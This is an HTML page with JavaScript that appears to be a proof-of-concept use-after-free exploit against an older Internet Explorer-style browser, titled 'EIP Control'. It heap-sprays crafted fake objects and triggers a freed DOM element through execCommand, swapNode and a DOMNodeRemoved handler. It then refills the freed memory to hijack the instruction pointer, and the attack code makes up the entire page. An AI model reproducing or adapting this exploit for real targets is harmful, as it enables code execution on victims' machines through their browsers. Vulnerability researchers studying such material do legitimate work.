<!DOCTYPE HTML> 
<html> 
<head> 
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">  
</head> 
<body id="realbody">
<div id="realdiv">
	EIP Control
</div>
<script>
var strarr = new Array();

fake_object_location = 0x20203020 // virtual machine
// fake_object_location = 0x20202020

heapspray(fake_object_location); // make fake object

function dword2data(dword)
{
    return String.fromCharCode(dword % 0x10000, dword / 0x10000)
}

function heapspray(fake_object_location){
	// make fake object
	var EIP = dword2data(0x90909090)
	var payload = dword2data(0)  // -10
	payload += dword2data(fake_object_location - 0x18)  // -c
	payload += dword2data(fake_object_location + 0x30) // -8 
	payload += dword2data(0x41414141) // -4
	/////////////////////////////////////////////////////////
	payload += EIP // 0x20202020 
	payload += dword2data(fake_object_location - 0xb4) //4  edi - 1e4 == 15f90?
	payload += dword2data(0x41414141) //8 
	payload += dword2data(0x41414141) //c 
	payload += dword2data(0x41414141) //10 
	payload += dword2data(0x41414141) //14 
	payload += dword2data(0x41414141) //18 
	payload += dword2data(0x41414141) //1c 
	payload += dword2data(0x41414141) //20 
	payload += dword2data(0x41414141) //24 
	payload += dword2data(0x8) //28  
	payload += dword2data(0x41414141) //2c  
	payload += dword2data(fake_object_location) //30 
	payload += dword2data(0x41414141) //34
	payload += dword2data(0x41414141) //38
	payload += dword2data(0x41414141) //3c
	payload += dword2data(0x41414141) //40
	payload += dword2data(0x41414141) //44
	payload += dword2data(0x41414141) //48
	payload += dword2data(0x41414141) //4c
	payload += dword2data(0x41414141) //50
	payload += dword2data(fake_object_location + 0x100) //54
	payload += dword2data(fake_object_location + 0x100) //58
	payload += dword2data(0x41414141) //5c
	payload += dword2data(0x41414141) //60
	payload += dword2data(0x41414141) //64
	payload += dword2data(0x41414141) //68
	payload += dword2data(0x41414141) //6c
	payload += dword2data(0x41414141) //70
	payload += dword2data(fake_object_location) //74 cmp ecx+24 0 recomputeworker
	payload += dword2data(0x41414141) //78
	payload += dword2data(0x41414141) //7c
	payload += dword2data(0x41414141) //80
	payload += dword2data(0x41414141) //84
	payload += dword2data(0x41414141) //88
	payload += dword2data(0x41414141) //8c
	payload += dword2data(0x41414141) //90
	payload += dword2data(0x41414141) //94
	payload += dword2data(0x41414141) //98
	payload += dword2data(0x41414141) //9c
	payload += dword2data(0x41414141) //a0
	payload += dword2data(0x41414141) //a4
	payload += dword2data(0x41414141) //a8
	payload += dword2data(0x41414141) //ac
	payload += dword2data(0x41414141) //b0
	payload += dword2data(0x41414141) //b4
	payload += dword2data(0x41414141) //b8
	payload += dword2data(0x41414141) //bc
	payload += dword2data(0x41414141) //c0
	payload += dword2data(0x41414141) //c4
	payload += dword2data(0x41414141) //c8
	payload += dword2data(0x41414141) //cc
	payload += dword2data(0x41414141) //d0
	payload += dword2data(0x41414141) //d4
	payload += dword2data(0x41414141) //d8
	payload += dword2data(0x41414141) //dc
	payload += dword2data(0x41414141) //e0
	payload += dword2data(fake_object_location + 0x160) //e4 
	payload += dword2data(fake_object_location + 0x160) //e8 
	payload += dword2data(0x41414141) //ec
	payload += dword2data(0x41414141) //f0
	payload += dword2data(0x41414141) //f4
	payload += dword2data(0) //f8
	payload += dword2data(0x41414141) //fc
	payload += dword2data(fake_object_location + 0x104) //100 
	payload += dword2data(0x41414141) //104
	payload += dword2data(fake_object_location - 0xc) //108
	payload += dword2data(fake_object_location - 0x10) //10c check 
	payload += dword2data(0x41414141) //110
	payload += dword2data(0x41414141) //114
	payload += dword2data(0x41414141) //118
	payload += dword2data(0x41414141) //11c
	payload += dword2data(0x41414141) //120
	payload += dword2data(0x40000) //124
	payload += dword2data(fake_object_location + 0x100) //128
	payload += dword2data(0) //12c
	payload += dword2data(fake_object_location + 0x108) //130
	payload += dword2data(0x41414141) //134
	payload += dword2data(fake_object_location + 0x118 - 0x3c) //138
	payload += dword2data(0x41414141) //13c
	payload += dword2data(0x41414141) //140
	payload += dword2data(0x41414141) //144
	payload += dword2data(0x08080808) //148 
	payload += dword2data(0x41414141) //14c check 8
	payload += dword2data(0x41414141) //150
	payload += dword2data(0x41414141) //154
	payload += dword2data(0x41414141) //158
	payload += dword2data(0x41414141) //15c
	payload += dword2data(fake_object_location + 0x120) //160 

	for(var i = 0; i<466; i++){
		payload += dword2data(0x41414141) 
	}

	for(var i = 0; i<400000; i++){
		strarr[i] = payload.toUpperCase();
	}
}

function spray(fake_object_location){
	// fill freed object
	// size : 0x60
	var payload = ""
	
	payload += dword2data(fake_object_location)
	for(var i = 0; i<22; i++){
		payload += dword2data(0x41414141) 
	}
	payload += unescape("\u4141")

	d = new Array(180);
		for (var i = 0; i < 180; i++) {
	        d[i] = document.createElement('div');
	        d[i].className = payload
		}
      }	

////////////////////////////////////////////
// Create Elements
////////////////////////////////////////////

var elem0 = document.createElement("b")
elem0.id = 'elem0'

var elem1 = document.createElement("b")
elem1.id = 'elem1'
elem1.tabIndex = 1

var elem2 = document.createElement("b")
elem2.id = 'elem2'

var elem3 = document.createElement("b")
elem3.id = 'elem3'

var elem4 = document.createElement("b")
elem4.id = 'elem4'

var elem5 = document.createElement("b")
elem5.id = 'elem5'

var elem6 = document.createElement("b")
elem6.id = 'elem6'

var elem7 = document.createElement("b")
elem7.id = 'elem7'

var elem8 = document.createElement("b")
elem8.id = 'elem8'

var elem9 = document.createElement("b")
elem9.id = 'elem9'

var elem10 = document.createElement("b")
elem10.id = 'elem10'

var elem11 = document.createElement("tr")
elem11.id = 'elem11'

var elem12 = document.createElement("b")
elem12.id = 'elem12'

var elem13 = document.createElement("b")
elem13.id = 'elem13'

var elem14 = document.createElement("b")
elem14.id = 'elem14'

var elem15 = document.createElement("b")
elem15.id = 'elem15'

var elem16 = document.createElement("b")
elem16.id = 'elem16'

var elem17 = document.createElement("b")
elem17.id = 'elem17'

var elem18 = document.createElement("b")
elem18.id = 'elem18'

var elem19 = document.createElement("b")
elem19.id = 'elem19'

////////////////////////////////////////////
// Init Dom Tree
////////////////////////////////////////////

var realbody = document.getElementById('realbody');

realbody.appendChild(elem0);
realbody.appendChild(elem1);
realbody.appendChild(elem2);
realbody.appendChild(elem3);
elem1.appendChild(elem4);
elem0.appendChild(elem5);
elem2.appendChild(elem6);
elem2.appendChild(elem7);
elem5.appendChild(elem8);
elem7.appendChild(elem9);
elem7.appendChild(elem10);
elem1.appendChild(elem11);
elem10.appendChild(elem12);
elem2.appendChild(elem13);
elem9.appendChild(elem14);
elem13.appendChild(elem15);
elem6.appendChild(elem16);
elem8.appendChild(elem17);
elem9.appendChild(elem18);

////////////////////////////////////////////

document.all[19].addEventListener('DOMNodeRemoved', bomber,'true')

range = document.body.createTextRange();
range.moveToElementText(elem11);
range.moveEnd('character', 1);
range.select()

document.execCommand("insertInputFileUpload", true, false);
elem9.removeChild(elem18); // trig

function bomber()
{
	try {document.all[20].swapNode(document.all[11]);} catch(e) { }
	document.all[11].focus(); // Free object here!
	try {document.all[5].swapNode(document.all[6]);} catch(e) { }
	try {document.all[5].swapNode(document.all[11]);} catch(e) { }
	spray(fake_object_location)
	// boom
}
</script>
</body> 
</html>
